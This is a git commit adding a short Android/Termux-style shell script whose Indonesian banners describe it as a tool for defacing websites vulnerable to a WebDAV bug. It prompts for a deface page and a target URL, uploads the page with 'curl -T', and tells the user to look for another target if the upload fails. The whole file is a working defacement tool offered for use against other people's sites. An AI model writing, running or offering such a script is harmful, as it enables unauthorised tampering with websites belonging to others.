3d08d38f4f6bbbcdacdd6372125a279e3a40b1a8
Eka saputra <79686853+Eka09@users.noreply.github.com>
2021-05-10 21:10:38 +0700

    Add files via upload

---
+++ Webdav.sh
@@ -0,0 +1,32 @@
+clear
+toilet -f future --filter border:gay 'WEBDAV'
+echo
+toilet -f term --filter border:gay 'Author : Eka09'
+toilet -f term --filter border:gay 'github: https://github.com/Eka09'
+echo
+toilet -f term --filter gay '''
+SCRIPT INI BERFUNGSI UNTUK MENDEFACE WEBSITE
+YANG VULN / RENTAN TERHADAP BUG WEBDAV
+'''
+echo
+toilet -f term --filter border:gay 'Example : script.html'
+toilet -f term --filter border:gay '_:: NAMA SCRIPT DEFACE KALIAN ::_'
+echo
+read sc
+echo
+toilet -f term --filter border:gay 'Example : http://site.com'
+toilet -f term --filter border:gay '_:: SITE TARGET KALIAN ::_'
+echo
+read target
+echo
+toilet -f term --filter gay 'PROSES ...'
+sleep 2
+echo
+echo
+curl -T /storage/emulated/0/$sc $target
+toilet -f term --filter gay 'HASIL : '$target/$sc
+toilet -f term --filter gay '''
+JIKA HASILNYA TERDEFACE BERARTI WEBSITE
+TERSEBUT VULN WEBDAV. JIKA TIDAK, CARI TARGET
+YANG LAIN :)
+'''
